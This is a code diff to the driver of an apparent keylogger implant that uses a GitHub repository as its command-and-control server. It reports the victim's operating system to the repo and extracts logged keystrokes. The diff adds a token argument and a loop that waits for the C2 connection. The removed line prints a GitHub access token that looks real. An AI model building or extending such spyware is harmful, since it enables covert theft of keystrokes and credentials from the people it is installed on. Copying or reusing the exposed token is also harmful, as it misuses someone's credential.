@@ -1,6 +1,7 @@
 from github_git import GitHubRepo, GitLike
 from keyboard_handler import KeyboardHandler
 
+import argparse
 import platform
 import sys
 import time 
@@ -21,14 +22,21 @@ def detect_os( ) -> str:
     # Ideally should never reach here and should be able to detect OS
     return "COULD_NOT_FIND_OS"
 
-def setup_communication_with_github_repo() -> GitHubRepo:
+def setup_communication_with_github_repo(token) -> GitHubRepo:
     # https://github.com/Alishah634/HID_Command_Control_Server
     repo = GitHubRepo(
         owner = "Alishah634",
         repo = "HID_Command_Control_Server",
         # Use a classic token not a fine grained one!
-        token = "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", # Hardcode belongs to Ali (BAD PRACTICE!!!)
+        token = token, # Hardcode belongs to Ali (BAD PRACTICE!!!)
     )
+
+    print("Waiting for C2 server connection...",end="",file=sys.stderr)
+    while not repo.can_reach_github():
+        print(".")
+        if repo.can_reach_github():
+            break
+        continue 
 
     # Read commits:
     commits = repo.get_recent_commits()
@@ -67,13 +75,24 @@ if __name__ == "__main__":
     # print("Sys Platform:", sys.platform)
     # print("Platform System:", platform.system())
 
+    parser = argparse.ArgumentParser(description="Driver code for the ")
+
+    parser.add_argument("--token", "-t", type=str, required=True, help="Enter the classic GitHub PAT, required to push to the C2 Server")
+    args = parser.parse_args()
+    if args.token:
+        token = str(args.token)
+    else:
+        print("CATASTROPHIC FAILURE SHOULD ENTER A PHYSCIAL LOG Anad timing based approach to key logging and extraction", file=sys.stderr)
+        sys.exit(0)
+
     operating_system_detected = detect_os()
     if operating_system_detected == "COULD_NOT_FIND_OS":
         print("FAILED to detect operating system detected", file=sys.sterr)
 
     # Set up connection with GitHub repo to recieve and extract commands:
-    repo = setup_communication_with_github_repo()
+    repo = setup_communication_with_github_repo(token)
     git = GitLike(repo, branch= "main")
+
     if repo.can_reach_github():
         # Add the detect_os:
         git.add("os.txt",f"{operating_system_detected}\n")
@@ -140,9 +159,8 @@ if __name__ == "__main__":
             keystrokes_to_extract = handler.extract_logged_keys(source = "memory", limit = None)
 
             # If no keystorkes to default to Logging, just set that we cant extract:
-            # TODO:: Ideally we should inform the command server of this decision by::q
-            #
-            # updating mode.txt and increment the ack.txt:
+            # TODO:: Ideally we should inform the command server of this decision by:
+            # updating mode.txt and increment the ack.txt or just update error.txt :
             if not keystrokes_to_extract: 
                 can_extract = False
                 print("There were no keys to extract...", file=sys.stderr)
